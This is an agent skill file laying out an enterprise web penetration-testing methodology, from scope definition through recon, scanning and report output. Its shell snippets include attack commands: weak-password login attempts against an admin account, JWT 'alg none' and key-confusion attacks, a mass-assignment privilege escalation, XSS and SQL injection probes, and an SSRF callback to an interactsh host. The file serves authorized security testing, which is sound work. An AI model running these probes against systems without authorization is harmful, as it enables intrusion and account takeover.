---
name: tech-enterprise-web
description: "Enterprise web penetration testing workflow. Scope definition, httpx fingerprinting, katana crawling, nuclei scanning, authentication testing, JWT analysis, business logic review, IDOR, dependency SCA, manual verification. Triggers: 'enterprise pentest', 'web assessment', 'web pentest workflow', 'authentication testing', 'jwt testing', 'business logic', 'sca analysis', 'api pentest', 'web application pentest'."
---

# Enterprise Web Penetration Testing

Structured methodology: scope → recon → scan → auth test → logic review → report.

---

## Phase 1: Scope & Authorization

```bash
# Document targets before starting:
cat > scope.txt << 'EOF'
In-scope:
  - https://app.target.com
  - https://api.target.com/v1
  - https://admin.target.com

Out-of-scope:
  - https://blog.target.com (static)
  - Third-party services

Testing window: 2026-06-20 08:00 to 18:00 UTC

Authorization contact: security@target.com
EOF
```

---

## Phase 2: Reconnaissance

```bash
TARGETS_FILE="targets.txt"
OUTPUT="./output"

# Identify web technologies:
httpx -list "$TARGETS_FILE" -title -server -status-code -tech-detect \
  -o "$OUTPUT/httpx_results.txt"

# Nuclei fingerprinting:
nuclei -list "$TARGETS_FILE" -tags tech -o "$OUTPUT/fingerprints.txt"

# SSL/TLS info:
sslyze --regular app.target.com

# Headers analysis:
for target in $(cat "$TARGETS_FILE"); do
  echo "=== $target ==="
  curl -sI "$target" | grep -iE "x-powered-by|server|content-security|x-frame|strict-transport"
done
```

---

## Phase 3: Content Discovery

```bash
TARGET="https://app.target.com"

# Crawl with katana:
katana -u "$TARGET" -depth 3 -jc -o "$OUTPUT/crawl_urls.txt"

# Directory brute-force (optional):
ffuf -u "$TARGET/FUZZ" -w /usr/share/wordlists/dirb/common.txt \
  -o "$OUTPUT/dirs.json" -of json -mc 200,301,302,403

# Extract interesting endpoints:
cat "$OUTPUT/crawl_urls.txt" | grep -E "api|admin|login|auth|token|upload|export" | sort -u

# API endpoint discovery:
cat "$OUTPUT/crawl_urls.txt" | grep -E "\.(json|xml|yaml|graphql)" | sort -u
```

---

## Phase 4: Vulnerability Scanning

```bash
TARGET="https://app.target.com"

# Full nuclei scan:
nuclei -u "$TARGET" -severity critical,high,medium \
  -o "$OUTPUT/nuclei_results.txt" -stats

# Specific templates:
nuclei -u "$TARGET" -tags cve,oast,exposure,sqli,xss \
  -o "$OUTPUT/nuclei_cve.txt"

# API security:
nuclei -u "$TARGET" -tags api,graphql,rest \
  -o "$OUTPUT/nuclei_api.txt"
```

---

## Phase 5: Authentication Testing

```bash
TARGET="https://app.target.com"

# Password policy test:
# Try: 1234, password, username (same as username), empty
for weak_pass in "1234" "password" "Password1" "admin" "123456"; do
  code=$(curl -so /dev/null -w '%{http_code}' -X POST "$TARGET/login" \
    -d "username=admin&password=$weak_pass")
  echo "$code: $weak_pass"
done

# MFA check:
# - Does it enforce MFA for admin accounts?
# - Is there a backup code bypass?
# - Can MFA be disabled by API call?

# Session cookie attributes:
curl -sI "$TARGET/login" -X POST -d "username=test&password=test" | grep Set-Cookie
# Check: Secure, HttpOnly, SameSite, path=/

# JWT analysis:
JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
# Decode:
echo "$JWT" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# JWT attacks:
# - algorithm none: {"alg": "none", "typ": "JWT"}
# - RS256 to HS256 with public key as secret
# Use: jwt_tool -M at -t "$TARGET/api/me" -rh "Authorization: Bearer $JWT"
```

---

## Phase 6: Business Logic Review

```bash
TARGET="https://app.target.com"

# Access control testing:
# 1. Map roles: guest → user → admin → superadmin
# 2. Test each endpoint with lower-privilege token

# IDOR checks:
# - Replace /api/users/123 with /api/users/124 (another user)
# - Replace GUIDs with zero GUID: 00000000-0000-0000-0000-000000000000

# Role escalation paths:
# - Can user assign themselves a higher role?
# - Is role check client-side only?
# - Can profile update include role parameter?

# Workflow bypass:
# - Skip payment step: go directly to /order/confirm without /payment
# - Discount stacking: apply same coupon twice

# Price manipulation:
# - Modify price in request body
# - Negative quantities

# Mass assignment:
curl -X POST "$TARGET/api/profile" \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "test", "role": "admin", "isAdmin": true}'
```

---

## Phase 7: Dependency Analysis

```bash
# Software Composition Analysis:
# JavaScript:
npm audit --json | python3 -m json.tool | grep -E "severity|module_name|path"

# Python:
pip-audit -r requirements.txt

# Ruby:
bundler-audit check --update

# Java:
mvn dependency-check:check

# Scan known vulnerable versions:
nuclei -u "https://TARGET" -tags technologies | grep -iE "version|outdated|cve"
```

---

## Phase 8: Manual Verification

```bash
# Top-priority findings → verify each manually:

# XSS verification:
curl -s "https://TARGET/search?q=<script>alert(1)</script>" | grep "<script>alert"

# SQL injection verification:
curl -s "https://TARGET/api/user?id=1'" | grep -iE "sql|error|syntax|mysql|postgres"

# SSRF verification (use interactsh):
./interactsh-client &
COLLAB_URL="abc.interactsh.com"
curl -s "https://TARGET/api/fetch" -d "url=http://$COLLAB_URL/test"

# Auth bypass verification:
curl -s "https://TARGET/admin/users" -H "Authorization: Bearer UNPRIVILEGED_TOKEN"

# Document all with:
# - Request/response pair
# - Impact description  
# - CVSS score
# - Remediation recommendation
```

---

## Output

Save to `.omop/engagement/vuln/web/`:
- `scope.txt` — engagement scope
- `nuclei-results.txt` — automated scan findings
- `manual-findings.md` — verified vulnerabilities
- `report.md` — final assessment report

## Next Phase

→ `pentest-report` for final report generation
→ `vuln-xxe` for XML-based vulnerabilities
→ `vuln-ssti` for template injection
